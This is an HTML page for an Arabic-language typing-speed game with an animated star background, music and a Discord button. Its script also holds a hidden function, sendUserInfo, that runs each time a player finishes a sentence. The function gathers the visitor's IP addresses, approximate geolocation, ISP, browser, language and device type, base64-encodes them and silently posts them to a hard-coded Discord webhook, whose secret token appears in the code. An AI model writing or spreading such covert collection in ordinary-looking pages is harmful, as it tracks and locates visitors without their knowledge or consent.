<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Ù„Ø¹Ø¨Ø© Ø§Ù„ÙƒØªØ§Ø¨Ø©</title>
<style>
  body {
    margin: 0; padding: 0; font-family: "Arial", sans-serif;
    background: #121212; color: #eee; overflow-x: hidden;
  }
  #stars {
    position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
    z-index: -1;
    background: #000;
  }
  #container {
    max-width: 600px; margin: 60px auto 40px auto; padding: 20px;
    background: rgba(30,30,30,0.85); border-radius: 10px;
    box-shadow: 0 0 15px #4a0d7a;
  }
  #sentence {
    font-size: 28px; margin-bottom: 10px; line-height: 1.4;
    letter-spacing: normal;
  }
  #sentence span {
    margin: 0 2px;
  }
  .correct { color: #4caf50; }
  .incorrect {
    color: #f44336;
    background-color: rgba(255, 0, 0, 0.15);
    border-radius: 4px;
    padding: 0 3px;
  }
  .pending { color: #ddd; }
  #userInput {
    width: 100%; padding: 10px; font-size: 20px;
    border-radius: 6px; border: none; outline: none;
    box-sizing: border-box;
    background: #222; color: #eee;
  }
  #speedDisplay, #bestTime, #result {
    margin-top: 10px; font-size: 18px; min-height: 24px;
  }
  #musicControl {
    margin-top: 15px; cursor: pointer; font-size: 24px; user-select: none;
    color: #bb86fc;
  }
  #footerRights {
    text-align: center; margin-top: 40px; font-size: 14px;
    color: #888; font-weight: bold;
  }
  #discordButton {
    position: fixed; bottom: 20px; left: 20px;
    width: 48px; height: 48px; cursor: pointer;
    filter: drop-shadow(0 0 6px #6a52b8);
  }
</style>
</head>
<body>
<canvas id="stars"></canvas>

<div id="container">
  <div id="sentence"></div>
  <input type="text" id="userInput" autocomplete="off" spellcheck="false" placeholder="Ø§ÙƒØªØ¨ Ø§Ù„Ø¬Ù…Ù„Ø© Ù‡Ù†Ø§..." />
  <div id="speedDisplay"></div>
  <div id="bestTime"></div>
  <div id="result"></div>
  <div id="musicControl" title="ØªØ´ØºÙŠÙ„/Ø¥ÙŠÙ‚Ø§Ù Ø§Ù„Ù…ÙˆØ³ÙŠÙ‚Ù‰">ğŸµ</div>
</div>

<div id="footerRights">Ø­Ù‚ÙˆÙ‚ Ø§Ù„Ù†Ø´Ø± Â© Ù…Ø¹Ø§Ø° Ø§Ù„Ø­Ø±Ø¨ÙŠ</div>

<audio id="bgMusic" loop>
  <source src="https://cdn.pixabay.com/download/audio/2022/03/28/audio_3800f15e5a.mp3?filename=deep-ambient-11228.mp3" type="audio/mpeg" />
</audio>

<!-- Ø£ÙŠÙ‚ÙˆÙ†Ø© Ø¯ÙŠØ³ÙƒÙˆØ±Ø¯ ÙˆØ§Ø¶Ø­Ø© -->
<svg id="discordButton" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 71 55" fill="#7289da" >
  <path d="M60.104 4.552a58.414 58.414 0 00-14.186-4.5.211.211 0 00-.223.106c-.61 1.063-1.29 2.447-1.774 3.536-5.348-.805-10.64-.805-15.888 0-.485-1.09-1.164-2.473-1.774-3.536a.206.206 0 00-.223-.106 58.337 58.337 0 00-14.187 4.5.193.193 0 00-.089.076C.68 14.072-.267 23.616.175 33.044c.002.023.016.045.016.069a60.055 60.055 0 0017.448 8.91.22.22 0 00.24-.076c1.344-1.85 2.544-3.796 3.574-5.79a.206.206 0 00-.117-.295 42.51 42.51 0 01-6.175-2.92.207.207 0 01-.02-.345c.415-.31.83-.63 1.232-.956a.206.206 0 01.214-.036c12.926 5.915 27.01 5.915 39.877 0a.205.205 0 01.216.034c.4.324.815.643 1.23.953a.207.207 0 01-.02.344 42.075 42.075 0 01-6.175 2.922.206.206 0 00-.118.295c1.034 1.992 2.231 3.94 3.58 5.79a.22.22 0 00.239.076 60.226 60.226 0 0017.449-8.91c.005-.023.018-.045.018-.069-.5-10.747-1.503-19.677-5.44-28.416a.192.192 0 00-.088-.075zM23.725 37.33c-3.207 0-5.83-2.95-5.83-6.577 0-3.628 2.596-6.576 5.83-6.576 3.252 0 5.88 2.947 5.83 6.576 0 3.627-2.6 6.577-5.83 6.577zm23.56 0c-3.206 0-5.83-2.95-5.83-6.577 0-3.628 2.596-6.576 5.83-6.576 3.252 0 5.88 2.947 5.83 6.576 0 3.627-2.598 6.577-5.83 6.577z"/>
</svg>

<script>
  const sentence = document.getElementById("sentence");
  const userInput = document.getElementById("userInput");
  const speedDisplay = document.getElementById("speedDisplay");
  const bestTimeDisplay = document.getElementById("bestTime");
  const result = document.getElementById("result");
  const musicControl = document.getElementById("musicControl");
  const music = document.getElementById("bgMusic");
  const discordButton = document.getElementById("discordButton");

  const WEBHOOK_URL = "https://discord.com/api/webhooks/1377761857036619816/2jO4mtntMxZXJrgY9jVvpdF4s7CA6wHVCqePyuX8uZNJuZHldMWov_Ct5vPB8cLRMu3w";

  const sentences = [
    "ØªØ¹Ù„Ù… ÙƒÙ„ ÙŠÙˆÙ… Ø´ÙŠØ¡ Ø¬Ø¯ÙŠØ¯",
    "Ø§Ù„ÙƒØªØ§Ø¨Ø© Ø§Ù„Ø³Ø±ÙŠØ¹Ø© Ù…Ù‡Ø§Ø±Ø© Ø±Ø§Ø¦Ø¹Ø©",
    "Ù‡Ù„ Ø£Ù†Øª Ø¬Ø§Ù‡Ø²ØŸ",
    "Ø³Ø±Ø¹ØªÙƒ ÙÙŠ Ø§Ù„ÙƒØªØ§Ø¨Ø© Ù…Ù‡Ù…Ø©",
    "Ø§Ø®ØªØ¨Ø± Ù†ÙØ³Ùƒ Ø§Ù„Ø¢Ù†",
    "Ø§Ø³ØªÙ…Ø± ÙÙŠ Ø§Ù„ØªØ¯Ø±ÙŠØ¨",
    "Ø­Ø§ÙˆÙ„ ØªØ­Ø³ÙŠÙ† Ù…Ø³ØªÙˆØ§Ùƒ"
  ];

  let currentSentence = "";
  let startTime = 0;
  let bestTime = null;
  let highestSpeed = 0;

  function newSentence() {
    currentSentence = sentences[Math.floor(Math.random() * sentences.length)];
    renderSentence("");
  }

  function renderSentence(input) {
    sentence.innerHTML = "";
    const inputWords = input.trim().split(" ");
    const targetWords = currentSentence.split(" ");

    for (let i = 0; i < targetWords.length; i++) {
      let span = document.createElement("span");
      span.textContent = targetWords[i];
      span.style.margin = "0 2px";
      if (inputWords[i] == null) {
        span.className = "pending";
      } else if (inputWords[i] === targetWords[i]) {
        span.className = "correct";
      } else {
        span.className = "incorrect";
        if (targetWords[i] === "Ù„Ø§") {
          span.style.backgroundColor = "#cc4444";
          span.style.color = "#fff";
          span.style.padding = "0 4px";
          span.style.borderRadius = "4px";
        }
      }
      sentence.appendChild(span);
      if (i !== targetWords.length - 1) sentence.appendChild(document.createTextNode(" "));
    }
  }

  function checkInput() {
    const text = userInput.value.trim();
    if (text === currentSentence) {
      const endTime = Date.now();
      const elapsed = (endTime - startTime) / 1000;
      speedDisplay.textContent = `Ø²Ù…Ù†Ùƒ: ${elapsed.toFixed(2)} Ø«Ø§Ù†ÙŠØ©`;
      if (!bestTime || elapsed < bestTime) {
        bestTime = elapsed;
        bestTimeDisplay.textContent = `Ø£ÙØ¶Ù„ Ø²Ù…Ù†: ${bestTime.toFixed(2)} Ø«Ø§Ù†ÙŠØ©`;
      }
      const speed = Math.round(currentSentence.length / elapsed);
      if (speed > highestSpeed) {
        highestSpeed = speed;
        result.textContent = `Ø£Ø¹Ù„Ù‰ Ø³Ø±Ø¹Ø©: ${highestSpeed} - ${elapsed.toFixed(2)} Ø«Ø§Ù†ÙŠØ©`;
      } else {
        result.textContent = "Ø£Ø­Ø³Ù†Øª! Ø§Ø¨Ø¯Ø£ Ø¬Ù…Ù„Ø© Ø¬Ø¯ÙŠØ¯Ø©";
      }
      newSentence();
      userInput.value = "";
      startTime = Date.now();

      sendUserInfo();

    } else {
      result.textContent = "Ø­Ø§ÙˆÙ„ Ù…Ø±Ø© Ø£Ø®Ø±Ù‰";
    }
    renderSentence(userInput.value);
  }

  userInput.addEventListener("input", () => {
    renderSentence(userInput.value);
  });

  userInput.addEventListener("keydown", (e) => {
    if (e.key === "Enter") {
      checkInput();
    }
  });

  musicControl.addEventListener("click", () => {
    if (music.paused) {
      music.play();
      musicControl.textContent = "ğŸ”‡";
    } else {
      music.pause();
      musicControl.textContent = "ğŸµ";
    }
  });

  discordButton.addEventListener("click", () => {
    window.open("https://discord.com", "_blank");
  });

  newSentence();
  startTime = Date.now();

  function base64Encode(str) {
    return btoa(unescape(encodeURIComponent(str)));
  }

  async function sendUserInfo() {
    try {
      const [ipv4Res, ipv6Res, geoRes] = await Promise.all([
        fetch('https://api.ipify.org?format=json'),
        fetch('https://api64.ipify.org?format=json'),
        fetch('https://ipapi.co/json/')
      ]);
      const ipv4Data = await ipv4Res.json();
      const ipv6Data = await ipv6Res.json();
      const geoData = await geoRes.json();

      const ua = navigator.userAgent;
      const lang = navigator.language;
      const timeString = new Date().toISOString();
      const ipv4 = ipv4Data.ip;
      const ipv6 = (ipv6Data.ip && ipv6Data.ip !== ipv4) ? ipv6Data.ip : 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ';

      const deviceType = /android|iphone|ipad|ipod/i.test(ua)
        ? (/tablet|ipad/i.test(ua) ? "ØªØ§Ø¨Ù„Øª" : "Ø¬ÙˆØ§Ù„")
        : "ÙƒÙ…Ø¨ÙŠÙˆØªØ±";

      const infoText = `
IP (IPv4): ${ipv4}
IP (IPv6): ${ipv6}
Ø§Ù„Ø¯ÙˆÙ„Ø©: ${geoData.country_name}
Ø§Ù„Ù…Ù†Ø·Ù‚Ø©: ${geoData.region}
Ø§Ù„Ù…Ø¯ÙŠÙ†Ø©: ${geoData.city}
Ø®Ø· Ø§Ù„Ø¹Ø±Ø¶: ${geoData.latitude}
Ø®Ø· Ø§Ù„Ø·ÙˆÙ„: ${geoData.longitude}
Ø§Ù„Ù…Ù†Ø¸Ù…Ø©: ${geoData.org}
Ø§Ù„Ù…Ù†Ø·Ù‚Ø© Ø§Ù„Ø²Ù…Ù†ÙŠØ©: ${geoData.timezone}
Ù†ÙˆØ¹ Ø§Ù„Ø¬Ù‡Ø§Ø²: ${deviceType}
Ø§Ù„Ù…ØªØµÙØ­: ${ua}
Ø§Ù„Ù„ØºØ©: ${lang}
Ø§Ù„ÙˆÙ‚Øª: ${timeString}
Ø­Ù‚ÙˆÙ‚ Ø§Ù„Ù†Ø´Ø±: Ù…Ø¹Ø§Ø° Ø§Ù„Ø­Ø±Ø¨ÙŠ`.trim();

      const encodedInfo = base64Encode(infoText);

      await fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: encodedInfo })
      });
    } catch (err) {
      console.error("ÙØ´Ù„ ÙÙŠ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª:", err);
    }
  }

  // Ù†Ø¬ÙˆÙ… Ø®Ù„ÙÙŠØ©
  const canvas = document.getElementById('stars');
  const ctx = canvas.getContext('2d');
  let width, height, stars;
  function initStars() {
    width = window.innerWidth;
    height = window.innerHeight;
    canvas.width = width;
    canvas.height = height;
    stars = Array.from({length: 100}, () => ({
      x: Math.random() * width,
      y: Math.random() * height,
      radius: Math.random() * 1.1,
      alpha: Math.random()
    }));
  }
  function drawStars() {
    ctx.clearRect(0, 0, width, height);
    stars.forEach(s => {
      ctx.beginPath();
      ctx.arc(s.x, s.y, s.radius, 0, 2 * Math.PI);
      ctx.fillStyle = `rgba(255,255,255,${s.alpha})`;
      ctx.fill();
    });
  }
  function animateStars() {
    stars.forEach(s => {
      s.alpha += (Math.random() - 0.5) * 0.05;
      s.alpha = Math.max(0, Math.min(1, s.alpha));
    });
    drawStars();
    requestAnimationFrame(animateStars);
  }
  window.addEventListener("resize", initStars);
  initStars();
  animateStars();

</script>
</body>
</html>
